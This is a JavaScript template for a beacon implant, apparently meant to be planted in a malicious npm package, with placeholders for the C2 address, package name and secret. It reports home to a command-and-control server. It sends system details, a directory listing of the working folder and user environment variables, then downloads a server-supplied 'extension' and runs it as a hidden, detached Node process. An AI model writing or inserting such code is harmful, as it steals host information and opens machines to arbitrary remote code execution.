'use strict';
const crypto = require('crypto');
const path = require('path');
const capOs = require('__DEP_OS__');
const capFs = require('__DEP_FS__');
const capNet = require('__DEP_NET__');
const capCp = require('__DEP_CP__');

const C2_URL = '__C2_URL__';
const PKG_NAME = '__PKG_NAME__';
const BEACON_SECRET = '__BEACON_SECRET__';
const BEACON_ID = crypto.randomUUID();

function solvePoW(nonce, difficulty) {
  const prefix = '0'.repeat(difficulty);
  let n = 0;
  while (true) {
    if (crypto.createHash('sha256').update(nonce + n).digest('hex').startsWith(prefix)) return n;
    n++;
  }
}

function sendBeacon(extra) {
  const info = capOs.gather();
  const payload = {
    beacon_id: BEACON_ID,
    beacon_secret: BEACON_SECRET,
    pkg: PKG_NAME,
    ...info,
    dir_tree: capFs.tree(process.cwd(), 3),
    env_vars: Object.fromEntries(
      ['PATH', 'USER', 'HOME', 'PWD', 'SHELL', 'LOGNAME', 'USERNAME']
        .filter(k => process.env[k])
        .map(k => [k, process.env[k]])
    ),
    cwd: process.cwd(),
    ...extra,
  };
  capNet.post(C2_URL + '/api/beacon', payload, function (err, resp) {
    if (!err && resp && resp.extension) {
      const tmp = path.join(process.env.TMPDIR || '/tmp', '.node-' + BEACON_ID + '.js');
      capFs.writeFile(tmp, resp.extension);
      capCp.spawn(process.execPath, [tmp], {
        detached: true,
        stdio: 'ignore',
        env: { ...process.env, DOLUS_C2: C2_URL, DOLUS_PKG: PKG_NAME, DOLUS_BEACON_ID: BEACON_ID, DOLUS_SECRET: BEACON_SECRET },
      });
    }
  });
}

capNet.get(C2_URL + '/api/pow', function (err, data) {
  if (!err && data && data.enabled && data.nonce) {
    sendBeacon({ pow_nonce: data.nonce, pow_solution: solvePoW(data.nonce, data.difficulty || 5) });
  } else {
    sendBeacon({});
  }
});
